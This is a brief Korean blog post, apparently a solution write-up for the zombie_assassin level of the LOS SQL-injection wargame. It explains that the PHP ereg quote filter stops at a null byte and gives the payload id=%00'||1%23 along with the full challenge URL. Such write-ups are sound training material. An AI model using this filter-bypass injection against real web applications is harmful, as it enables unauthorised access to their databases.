---
layout: post
title: LOS ZOMBIE_ASSASSIN 
date: 2015-10-23 00:42:00 +0900
category: Hacking
---
자 문제를 보면 
```
  if(@ereg("'",$_GET[id])) exit("HeHe"); 
  if(@ereg("'",$_GET[pw])) exit("HeHe"); 
```
ereg가 있다.



취약하다



ereg 와 eregi는 취약하다

ereg는  null값까지만 받고





떄문에 %00을 넣어주고 



id=%00'||1%23

해주게 되면 id를 그만 입력받고 뒤에 값을 || 연산한후 뒤에 쿼리를 주석처리해 버린다.



```
http://los.sandbox.cash/chall/zombie_assassin_eb9c4ab86b8c26748f3ce3e91dcd4dd8.php?id=%00%27||1%23
```






